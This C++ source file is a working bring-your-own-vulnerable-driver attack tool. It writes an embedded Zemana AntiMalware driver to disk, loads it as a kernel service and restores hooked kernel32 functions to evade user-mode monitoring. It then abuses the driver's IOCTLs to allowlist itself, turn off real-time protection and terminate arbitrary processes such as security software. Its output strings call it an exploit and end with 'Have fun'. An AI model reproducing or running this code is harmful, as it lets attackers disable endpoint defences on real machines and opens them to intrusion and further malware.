#include <iostream>
#include <winternl.h>
#include <windows.h>

#include <string>
#include "main.h"
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <fstream>
#include <locale>
#include <codecvt>

HMODULE myGetModuleHandle(PWSTR search) {

// obtaining the offset of PPEB from the beginning of TEB
    PEB* pPeb = (PEB*)__readgsqword(0x60);

// for x86
// PEB* pPeb = (PEB*)__readgsqword(0x30);

// Get PEB
    PEB_LDR_DATA* Ldr = pPeb->Ldr;
    LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;

// Start iterating
    LIST_ENTRY* pStartListEntry = ModuleList->Flink;

// iterating through the linked list.
    WCHAR mystr[MAX_PATH] = { 0 };
    WCHAR substr[MAX_PATH] = { 0 };
    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {

// getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
        LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
//printf("%S : %p\n",pEntry->FullDllName.Buffer,(HMODULE)pEntry->DllBase);

        if(!wcscmp(pEntry->FullDllName.Buffer,search)){
            return (HMODULE)pEntry->DllBase;
        }
    }

// the needed DLL wasn't found
    return NULL;
}

std::wstring GetFullTempPath() {
    wchar_t temp_directory[MAX_PATH + 1] = { 0 };
    const uint32_t get_temp_path_ret = GetTempPathW(sizeof(temp_directory) / 2, temp_directory);
    if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH + 1) {
        printf("[-] Failed to get temp path\n");
        return L"";
    }
    if (temp_directory[wcslen(temp_directory) - 1] == L'\\')
        temp_directory[wcslen(temp_directory) - 1] = 0x0;

    return temp_directory;
}

char zemina[7]="zemina";
const std::wstring driver_name=L"zemina";
const std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
std::wstring nPath;
HMODULE ntdll;

typedef NTSTATUS(*myNtLoadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(*myNtUnloadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(*myRtlAdjustPrivilege)(_In_ ULONG Privilege, _In_ BOOLEAN Enable, _In_ BOOLEAN Client, _Out_ PBOOLEAN WasEnabled);
typedef VOID(*myRtlInitUnicodeString)(_Out_ PUNICODE_STRING DestinationString, _In_ __drv_aliasesMem PCWSTR SourceString);
UNICODE_STRING serviceStr;

int hookChecker(const wchar_t* libPath, const wchar_t* lib, const char* funToCheck) {

    HANDLE dllFile = CreateFileW(libPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dllFileSize = GetFileSize(dllFile, NULL);
    HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(dllFile);

// analyze the dll
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals);

// find the original function code
    PVOID functionFromDisk = NULL;
    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
    {
        PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
        if (!strcmp(pFunctionName, funToCheck))
        {
            functionFromDisk = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
            break;
        }
    }
// compare functions
    PVOID functionFromMemory = (PVOID)GetProcAddress(GetModuleHandleW(lib), funToCheck);
    if (!memcmp(functionFromMemory, functionFromDisk, 16))
    {
        printf("%s was not hooked\n",funToCheck);
        return 0;
    }

    printf("fixing hook on %s\n",funToCheck);
    DWORD old_protection;
    VirtualProtect(functionFromMemory, 16, PAGE_EXECUTE_READWRITE,  &old_protection);
    memcpy(functionFromMemory,functionFromDisk,16);
    VirtualProtect(functionFromMemory, 16, old_protection,  &old_protection);
    return 1;

}

void testHook(const wchar_t* lib, const char* fun) {
    PVOID pMessageBoxW = (PVOID)GetProcAddress(GetModuleHandleW(lib), fun);
    DWORD oldProtect;
    VirtualProtect(pMessageBoxW, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    char hook[] = { static_cast<char>(0xC3) }; // ret
    memcpy(pMessageBoxW, hook, 1);
    VirtualProtect(pMessageBoxW, 1, oldProtect, &oldProtect);
    MessageBoxW(NULL, L"Hooked", L"Hooked", 0); // won't show up if you hooked it

}

#define ZMN_IOCTL_TYPE 0x8000
#define ZMN_IOCTL_TERMINATE_PROCESS CTL_CODE(ZMN_IOCTL_TYPE, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x80002048


bool terminate_process(HANDLE device_handle,uint32_t process_id)
{
    DWORD buffer = process_id;
    DWORD bytes_returned = 0;
    return DeviceIoControl(device_handle, ZMN_IOCTL_TERMINATE_PROCESS, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &bytes_returned, NULL);
}


typedef void * (__stdcall *myDeviceIoControl)(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);

BOOL LoadNTDriver()
{

    std::wstring string_to_convert=L"\\??\\"+GetFullTempPath()+L"\\zemina.sys";
//setup converter
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
    std::string converted_str = converter.to_bytes( string_to_convert );
    BOOL bRet = FALSE;

    SC_HANDLE hServiceMgr = NULL;
    SC_HANDLE hServiceDDK = NULL;

    hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    if (hServiceMgr == NULL)
    {

        printf("OpenSCManager() Faild %d ! \n", GetLastError());
        bRet = FALSE;
        goto BeforeExit;
    }
    else
    {
        printf("OpenSCManager() ok ! \n");
    }



    hServiceDDK = CreateService(hServiceMgr,
                                zemina,
                                zemina,
                                SERVICE_ALL_ACCESS,
                                SERVICE_KERNEL_DRIVER,
                                SERVICE_DEMAND_START,
                                SERVICE_ERROR_IGNORE,
                                converted_str.c_str(),
                                NULL,
                                NULL,
                                NULL,
                                NULL,
                                NULL);

    DWORD dwRtn;
    if (hServiceDDK == NULL)
    {
        dwRtn = GetLastError();
        if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_EXISTS)
        {
            printf("CrateService() Faild %d ! \n", dwRtn);
            bRet = FALSE;
            goto BeforeExit;
        }
        else
        {
            printf("CrateService() Faild Service is ERROR_IO_PENDING or ERROR_SERVICE_EXISTS! \n");
        }

        hServiceDDK = OpenService(hServiceMgr, zemina, SERVICE_ALL_ACCESS);
        if (hServiceDDK == NULL)
        {
            dwRtn = GetLastError();
            printf("OpenService() Faild %d ! \n", dwRtn);
            bRet = FALSE;
            goto BeforeExit;
        }
        else
        {
            printf("OpenService() ok ! \n");
        }
    }
    else
    {
        printf("CrateService() ok ! \n");
    }

    bRet = StartService(hServiceDDK, NULL, NULL);
    if (!bRet)
    {
        DWORD dwRtn = GetLastError();
        if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_ALREADY_RUNNING)
        {
            printf("StartService() Faild %d ! \n", dwRtn);
            bRet = FALSE;
            goto BeforeExit;
        }
        else
        {
            if (dwRtn == ERROR_IO_PENDING)
            {
                printf("StartService() Faild ERROR_IO_PENDING ! \n");
                bRet = FALSE;
                goto BeforeExit;
            }
            else
            {
                printf("StartService() Faild ERROR_SERVICE_ALREADY_RUNNING ! \n");
                bRet = TRUE;
                goto BeforeExit;
            }
        }
    }
    bRet = TRUE;
    DWORD ssp;
    BeforeExit:
    if (hServiceDDK)
    {
        /*if(!ControlServiceEx(hServiceDDK,
                         SERVICE_CONTROL_STOP,
                         ssp,
                         NULL))
        {
            dwRtn = GetLastError();
            printf("StopService() Faild %d ! \n", dwRtn);
        }*/


        CloseServiceHandle(hServiceDDK);
    }
    if (hServiceMgr)
    {
        CloseServiceHandle(hServiceMgr);
    }
    return bRet;
}
/*
bool StopAndRemove() {


    HKEY driver_service;
    LSTATUS status = RegOpenKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &driver_service);
    if (status != ERROR_SUCCESS) {
        if (status == ERROR_FILE_NOT_FOUND) {
            return true;
        }
        return false;
    }
    RegCloseKey(driver_service);


    auto customNtUnloadDriver = (myNtUnloadDriver) GetProcAddress(ntdll, "NtUnloadDriver");

    NTSTATUS st = customNtUnloadDriver(&serviceStr);

    printf("[+] NtUnloadDriver Status 0x\n");


    printf("Driver unloaded\n");

    //setup converter
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
    std::string converted_str = converter.to_bytes( nPath );

    std::ofstream wf(converted_str, std::ios::out | std::ios::binary);

    DeleteFile(reinterpret_cast<LPCSTR>(nPath[5]));
    status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
    if (status != ERROR_SUCCESS) {
        return false;
    }
    return true;
}*/
int main(int argc, char** argv) {

    ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll == NULL) {
        return false;
    }
    std::wstring string_to_convert=GetFullTempPath()+L"\\zemina.sys";
//setup converter
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
    std::string converted_str = converter.to_bytes( string_to_convert );

    std::ofstream wf(converted_str, std::ios::out | std::ios::binary);

    wf.write(driver, 203680);
    wf.close();
    /*
    nPath=L"\\??\\"+GetFullTempPath()+L"\\zemina.sys";
    char format[100]="sc create %s binpath= %s type=kernel";
    const char *char_name = converted_str.c_str();
    char stream[1000];
    snprintf(stream,100,format,zemina,"C:\\Users\\BLUE_GIGI\\AppData\\Local\\Temp\\zemina.sys");
    printf("%s\n",stream);
    //printf("%s",exec(stream).c_str());
    */

    auto customRtlAdjustPrivilege = (myRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
    BOOLEAN SeLoadDriverWasEnabled;
    NTSTATUS Status = customRtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
    if (!NT_SUCCESS(Status)) {
        printf("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\n");
        return false;
    }
    LoadNTDriver();



    printf("\nChecking hooks\n");
    hookChecker(L"C:\\Windows\\System32\\kernel32.dll", L"kernel32.dll", "CreateFileA");
    hookChecker(L"C:\\Windows\\System32\\kernel32.dll", L"kernel32.dll", "CreateFileW");
    hookChecker(L"C:\\Windows\\System32\\kernel32.dll", L"kernel32.dll", "DeviceIoControl");


    printf("\nStarting device control\n");
    myDeviceIoControl dynamicIoControl = (myDeviceIoControl) GetProcAddress((HINSTANCE) LoadLibrary("kernel32.dll"),
                                                                            "DeviceIoControl");

    HANDLE hDevice = 0;
    int exploit_pid = 0;
    bool success = 0, disable_zam = 0, disable_rt = 0;
    static void *address;

    std::cout << "[-] Retrieving a handle to the zemina device driver" << std::endl;
    hDevice = CreateFile("\\\\.\\ZemanaAntiMalware", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hDevice) {
        std::cout << "\t[!] Failed to get a handle to the zemina device driver. Error code: " << ::GetLastError()
                  << std::endl;
        return -1;
    }
    std::cout << "\t[+] zemina AntiMalware HANDLE: 0x" << std::hex << hDevice << std::endl;

    std::cout << "[-] Adding exploit's process to the allowlist" << std::endl;
    exploit_pid = GetCurrentProcessId();
    if (!exploit_pid) {
        std::cout << "\t[!] Failed to get exploit's process PID. Error code: " << ::GetLastError() << std::endl;
        return -1;
    }
    std::cout << "\t[+] Exploit process' PID: " << exploit_pid << std::endl;


    success = dynamicIoControl(hDevice, 0x80002010, &exploit_pid, sizeof(exploit_pid), NULL, 0, NULL, NULL);
    if (!success) {
        std::cout << "\t[!] Failed to add exploit's process to the allowlist. Error code: " << ::GetLastError()
                  << std::endl;
        return -1;
    }
    std::cout << "\t[+] Exploit process' added to the allowlist" << std::endl;

    std::cout << "[-] Disabling ZAM Guard and Real-Time Protection" << std::endl;
    disable_zam = DeviceIoControl(hDevice, 0x80002064, NULL, sizeof(exploit_pid), NULL, 0, NULL, NULL);
    disable_rt = DeviceIoControl(hDevice, 0x80002090, NULL, sizeof(exploit_pid), NULL, 0, NULL, NULL);
    if (!disable_zam || !disable_rt) {
        std::cout << "\t[!] Failed to disable ZAM Guard or Real-Time Protection" << std::endl;
    }
    std::cout << "\t[+] Disabled ZAM Guard and Real-Time Protection" << std::endl;

    std::cout << "\t[+] Terminating processes \n";


    for(int i=1;i<argc;i++)
    {
        int pid = atoi(argv[i]);
        if (!terminate_process(hDevice, pid)) {
            std::cout << "\t[+] Unable to terminate" << std::endl;
        }
        else
            printf("\t[+] %d terminated\n",pid);

    }

    std::cout << "\t[+] Have fun" << std::endl;

    char stream[1024];
    char stop[100]="sc stop %s";
    char del[100]="sc delete %s";

    snprintf(stream,100,stop,zemina);
    system(stream);
    printf("Wait some seconds for service deletion\n");
    Sleep(5);

    snprintf(stream,100,del,zemina);
    system(stream);

    //printf("%s",exec(stream).c_str());    return 0;
}